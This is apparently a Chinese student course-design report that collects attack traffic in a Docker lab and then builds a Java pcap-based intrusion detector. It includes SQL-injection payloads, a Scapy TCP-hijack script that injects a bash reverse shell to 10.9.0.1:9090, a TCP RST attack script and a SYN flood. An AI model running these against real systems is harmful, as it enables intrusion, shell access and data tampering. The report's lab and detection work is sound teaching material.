

# 网络空间安全综合课程设计

[TOC]

**57118106强珂阳  57118202 付孜  57118232谢隆文  57118233 周厚霖  57118235 杨浩喆**

## 一、攻击流量样本采集

### 1、跨站请求伪造攻击`(CSRF)`

修改本地`/etc/hosts`文件，以便将主机名映射到对应的`IP`地址。

![1](1.JPG)

打开对应环境进行相关操作。

![2](2.JPG)

![3](3.JPG)

![4](4.JPG)

![16](17.JPG)

![17](16.JPG)

### 2、跨站脚本攻击`(XSS)`

设置`/etc/hosts`文件。

![5](5.JPG)

在`Samy`主页编辑`profile`，选择`Edit HTML`，嵌入`JavaScript`代码。

![6](6.JPG)

在`Alice`账户里查看`Samy`主页，可看到一个简单的`XSS`攻击执行。

![7](7.JPG)

### 3、SQL注入攻击

修改本地`/etc/hosts`文件，以便将主机名映射到对应的`IP`地址。

![8](8.JPG)

在`MySQL`容器连接到数据库，并打印出存储员工信息的表。

![9](9.JPG)

利用语句`admin'#`，登录到管理员账户，因为密码部分被`#`注释，我们可以绕过密码部分登录到任何用户。

![10](10.JPG)

![11](11.JPG)

利用同样的方法登录到`Boby`用户。

![12](12.JPG)

利用`',salary=1#`，可以将全部员工的工资修改为`1`。

![13](13.JPG)

![14](14.JPG)

![15](15.JPG)

### 4、扫描

扫描主要是对目标机器的每个端口发送`SYN`报文，检测端口的开放程度，通过`nmap`实现。

### 5、远程控制

```python
#!/usr/bin/env python3
from scapy.all import *

pkts = []
def add(pkt):
    pkts.append(pkt)

def spoof_pkt(pkt):
    ip = IP(src="10.9.0.6", dst="10.9.0.5")
    tcp =TCP(sport=pkt[TCP].sport, dport=23, flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
    data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
    newpkt = ip/tcp/data
    ls(newpkt)
    send(newpkt,verbose=0)

pkt = sniff(iface='br-f460e2934f17', filter='tcp and src host 10.9.0.6 and dst host 10.9.0.5 and dst port 23', prn=add)
spoof_pkt(pkts[-1])
```

在攻击者容器运行攻击程序，从容器`2`向容器`1`建立`telnet`连接，攻击者容器运行`nc -lnv 9090`，最终攻击者伪造报文发往服务器来创建反向 `shell`。

![18](18.JPG)

### 6、各种类型`Dos`攻击

实验中实现的`Dos`攻击主要以`SYN Flood`为主，进入`docker3(10.9.0.1)` 实施攻击，在本地`volumes`文件夹中进行编译，然后在`docker3`中运行`synflood 10.9.0.5 23`进行攻击。

![19](20.JPG)

然后在`docker1`中使用`netstat -nat`查看，可以看到出现了许多状态为`SYN_RECV`的套接字，说明只进行了第一次握手，并没有后续的 `TCP`连接请求。

![20](19.JPG)

### 7、TCP  Attack

自动攻击的代码`AutoAttack.py`如下，因为容器默认在同一网段，所以我们设置了`RST`报文的`TTL=120`，用于区分。

```python
#!/usr/bin/env python3
from scapy.all import *

pkts = []
def add(pkt):
    pkts.append(pkt)

def spoof_pkt(pkt):
    ip = IP(src="10.9.0.6", dst="10.9.0.5", ttl=120)
    tcp =TCP(sport=pkt[TCP].sport, dport=23, flags='R', seq=pkt[TCP].seq, ack=pkt[TCP].ack)
    pkt = ip/tcp
    ls(pkt)
    send(pkt, verbose=0)

pkt = sniff(iface='br-cf6ac9fb1896', filter='tcp and src host 10.9.0.6 and dst host 10.9.0.5 and dst port 23', prn=add)
spoof_pkt(pkts[-1])
```

先在`docker3(10.9.0.1)`上运行攻击程序，然后在`docker2(10.9.0.6)`上与`docker1(10.9.0.5)`建立`telnet`连接，`ctrl+c`中断程序，然后观察到`docker2`上的`telnet`连接中断。

![21](21.JPG)

![22](22.JPG)

## 二、防御系统设计

### 1、基于报文负载特征的检测

#### ① 反向`shell`

反向`shell`的攻击流量见`remote_cotrol.pcap`，攻击负载见下图：

`/bin/bash -i`：`i`代表交互`interactive`，意味着`shell`必须是交互的；

`> dev/tcp/10.9.0.1/9090`：导致`shell`的输出被重定向到`tcp`连接的`10.9.0.1`的`9090`端口，标准输出由文件描述符`1`表示；

`0<&1`：文件描述符`0`表示标准输入`(stdin)`，从`tcp`连接获取`shell`的输入；

`2>&1`：文件描述符`2`表示标准错误`(stderr)`，使得错误输出被重定向到`tcp`连接。

因此在检测时，只需要判断`payload`是否包含与攻击相关的重定向符即可，因为没有重定向符是无法交互的。

![23](23.JPG)

#### ② `XSS`

我们所要检测的`XSS`攻击为存储型`XSS`，`JavaScript`代码是内嵌在网页源码中的，因此在受害者端的请求报文无法检测，于是我们抓取了攻击者在修改个人简介时的请求报文，在此时的请求报文负载中匹配类`JavaScript`代码。

![24](27.JPG)

#### ③ `SQL`注入

`SQL`注入的攻击`payload`如下图所示，`SQL`注入语句常常包含`' or 1=1#`，`admin'#`等语句或特殊字符可以绕过密码，在抓包时，我们发现空格和特殊字符都使用了`url`编码，因此在检测时，只要判断是否包含类似的字符即可，比如`%27%23`。

![25](25.JPG)

![26](26.JPG)

#### ④ `CSRF`

在跨站请求伪造攻击的报文中，我们可以看到跳转网页的后缀`addfriend.html`，还有攻击者的主机域名`www.attacker32.com`，我们可以任选一项作为报文负载特征进行匹配。

![28](28.JPG)

### 2、基于流的检测

网络中流的标识符为`proto`、`sip`、`sport`、`dip`、`dport`，对于`TCP Reset`攻击，由于伪造`Reset`报⽂的服务器与真实服务器所处的位置不同，因此`TTL`值有可能会发⽣较⼤的变化，我们可以根据这个特点发现`TCP Reset`攻击。正常的`TCP`报文中的`TTL`值为`64`，但在`TCP Reset`攻击报文中的`TTL`明显大于`64`，我们设定一个阈值为`5`，当相邻的`TCP`流的`TTL`差值大于阈值的时候，我们可以判定为`TCP Reset`攻击。

![29](29.JPG)

## 三、数据结构及关键代码

我们知道`pcap`文件是以字节流的方式存储的，因此我们想要提取其中的数据，只要正确地划分字节流即可。

首先是文件的头部，我们定义为`GlobalHeader(24B)`。

这里我们要特别注意两个点，一个是`magic(4B)`，它用于标记文件开始，并用来识别文件和字节顺序，值可以为`0xa1b2c3d4`或者`0xd4c3b2a1`，如果是`0xa1b2c3d4`表示是大端模式，按照原来的顺序一个字节一个字节的读，如果是`0xd4c3b2a1`表示小端模式，下面的字节都要交换顺序。现在的电脑大部分是小端模式。

另外一个是`LinkType(4B)`，它表示链路类型，这里设置为`113`，表示`Linux cooked capture`。

```java
public class GlobalHeader {
    /**
     * special Linux "cooked" capture
      */
    public static final int LINK_TYPE_LINUX_PCAP = 113;

    private int magic;
    private int linkType;

    public int getMagic() {
        return magic;
    }

    public void setMagic(int magic) {
        this.magic = magic;
    }

    public int getLinkType() {
        return linkType;
    }

    public void setLinkType(int linkType) {
        this.linkType = linkType;
    }

    public GlobalHeader() {}

    @Override
    public String toString() {
        return "GlobalHeader{" +
                "magic=" + magic +
                ", linkType=" + linkType +
                '}';
    }
}
```

接下来是数据包头`PacketHeader(16B)`。

这里有我们所需要的时间`(s & ms)`。

```java
/**
 * Pcap 数据包头
 */
public class PacketHeader {

    /**
     * 时间戳 高位（秒）：记录数据包抓获的时间
     * 记录方式是从格林尼治时间的1970年1月1日 00:00:00 到抓包时经过的秒数（4个字节）
     */
    private int timeS;
    /**
     * 时间戳 低位（微秒）：抓取数据包时的微秒值（4个字节）
     */
    private int timeMs;
    /**
     * 数据包长度：标识所抓获的数据包保存在 pcap 文件中的实际长度，以字节为单位（4个字节）
     */
    private int capLen;
    /**
     * 数据包实际长度： 所抓获的数据包的真实长度（4个字节）
     */
    private int len;

    @Override
    public String toString() {
        return "PacketHeader{" +
                "timeS=" + timeS +
                ", timeMs=" + timeMs +
                ", capLen=" + capLen +
                ", len=" + len +
                '}';
    }

    public int getTimeMs() {
        return timeMs;
    }

    public void setTimeMs(int timeMs) {
        this.timeMs = timeMs;
    }

    public int getCapLen() {
        return capLen;
    }

    public void setCapLen(int capLen) {
        this.capLen = capLen;
    }

    public int getLen() {
        return len;
    }

    public void setLen(int len) {
        this.len = len;
    }

    public int getTimeS() {

        return timeS;
    }

    public void setTimeS(int timeS) {
        this.timeS = timeS;
    }

    public PacketHeader() {}

}
```

接下来是帧头，里面标记了后面所用的协议号，即`IPv4`的协议号。

```java
/**
 * 帧头（Ethernet Header）
 */

public class FrameHeader {
    // 目前仅仅解析Linux cooked capture的帧
    /*
     *     | 2-bytes | 2-bytes | 2-bytes | 6-bytes src | 2-bytes | 2-bytes protocol type |
     *     |-----------------------------------  16bytes  -------------------------------|
     *     IPv4 中type为采用 0x0800
     */
    public static final int PROTOCOL_IP = 2048;

    private int protocol;

    public int getProtocol() {
        return protocol;
    }

    public void setProtocol(int protocol) {
        this.protocol = protocol;
    }

    public FrameHeader() {}
}
```

接下来处理`IP`数据报头，里面的关键数据由源宿`IP`地址和`TTL`(这个用于检测`TCP Reset`攻击)，并可以确定后面所使用的是`TCP`协议。

```java
/**
 * IP 数据报头
 */
public class IPHeader {

    public static final int PROTOCOL_TCP = 6;
    public static final int PROTOCOL_UDP = 17;

    /**
     * 首部长度
     */
    private int headerLen;

    /**
     * 总长度（2 字节）
     */
    private int totalLen;

    /**
     *  TTL（1 字节）
     */
    private int ttl;

    /**
     * 协议类型（1 字节）
     */
    private int protocol;

    /**
     * 源 IP（4 字节）
     */
    private int srcIP;

    /**
     * 目的 IP（4 字节）
     */
    private int dstIP;

    public void setTotalLen(short totalLen) {
        this.totalLen = totalLen;
    }

    public int getProtocol() {
        return protocol;
    }

    public void setProtocol(int protocol) {
        this.protocol = protocol;
    }

    public int getTtl() {
        return ttl;
    }

    public void setTtl(int ttl) {
        this.ttl = ttl;
    }

    public int getSrcIP() {
        return srcIP;
    }

    public void setSrcIP(int srcIP) {
        this.srcIP = srcIP;
    }

    public int getDstIP() {
        return dstIP;
    }

    public void setDstIP(int dstIP) {
        this.dstIP = dstIP;
    }

    public void setTotalLen(int totalLen) {
        this.totalLen = totalLen;
    }

    public int getHeaderLen() {

        return headerLen;
    }

    public void setHeaderLen(int headerLen) {
        this.headerLen = headerLen;
    }

    public IPHeader() {	}

    @Override
    public String toString() {
        return "IPHeader{" +
                "headerLen=" + headerLen +
                ", totalLen=" + totalLen +
                ", ttl=" + ttl +
                ", protocol=" + protocol +
                ", srcIP=" + IPUtils.int2IPv4(srcIP) +
                ", dstIP=" + IPUtils.int2IPv4(dstIP)+
                '}';
    }
}
```

在处理`TCP`包头时，我们提取到的关键数据有源宿端口号，以及`flag`，用于确定`TCP Reset`攻击的`RST`报文。

```java
/**
 * TCP 包头：20 字节
 */
public class TCPHeader {

    /**
     * 源端口（2 字节）
     */
    private int srcPort;

    /**
     * 目的端口（2 字节）
     */
    private int dstPort;

    /**
     * 数据报头的长度(4 bit) + 保留(4 bit) = 1 byte
     */
    private int headerLen;

    /**
     * RST Flag 1 byte --> 00000100
     */
    private int RstFlag;

    public int getSrcPort() {
        return srcPort;
    }

    public void setSrcPort(int srcPort) {
        this.srcPort = srcPort;
    }

    public int getDstPort() {
        return dstPort;
    }

    public void setDstPort(int dstPort) {
        this.dstPort = dstPort;
    }

    public int getHeaderLen() {
        return headerLen;
    }

    public int getRstFlag() {
        return RstFlag;
    }

    public void setRstFlag(int RstFlag) {
        this.RstFlag = RstFlag;
    }

    public void setHeaderLen(int headerLen) {
        this.headerLen = headerLen;
    }

    public TCPHeader() {}

    @Override
    public String toString() {
        return "TCPHeader [srcPort=" + srcPort
                + ", dstPort=" + dstPort
                + ", headerLen=" + headerLen
                + ", RstFlag=" + RstFlag
                + "]";
    }
}
```

剩下的字节流即为有效负载，大多数为我们要用的`HTTP`包的数据，我们全部将它们转换成字符，便可以根据报文负载特征进行检测。

```java
byte[] PayloadData = Arrays.copyOfRange(packetDataBuffer,16 + ipHeaderLen + 14,packetDataBuffer.length);
        int DataLen = PayloadData.length;
        String StrPayloadData = new String();
        if(DataLen != 0) {
            for(int i=0; i<DataLen; i++) {
                if(PayloadData[i] < 0)
                    StrPayloadData = StrPayloadData + (char)(PayloadData[i]+256);
                else
                    StrPayloadData = StrPayloadData + (char)(PayloadData[i]);
            }
        }
```

基于流的检测，我们需要首先判断这条流的`TTL`与相邻流的`TTL`之差是否大于阈值，然后判断这条流是否为`RST`流，即`tcpHeader.getRstFlag()==4`，如果是则输出警报。

```java
        /**
         * 基于流的检测
         */
        if(TtlList.size()==0) {
            TtlList.add(ipHeader.getTtl());
        }
        else {
            if( Math.abs(ipHeader.getTtl()-TtlList.get(0))>5 ) {
                if(tcpHeader.getRstFlag()==4) {
                    String TCP_Reset_Detect = Integer.toString(ipHeader.getSrcIP()) + ' ' + Integer.toString(tcpHeader.getSrcPort())
                            + ' ' + Integer.toString(ipHeader.getDstIP()) + ' ' + Integer.toString(tcpHeader.getDstPort()) + ' ' + "TCP_Reset";
                    Alert+=TCP_Reset_Detect;
                    flag = 1;
                    System.out.println(Alert);
                    AlertFile.WriteAlert(Alert, "TCP_Reset");
                }
            }
            TtlList.set(0, ipHeader.getTtl());
        }
```

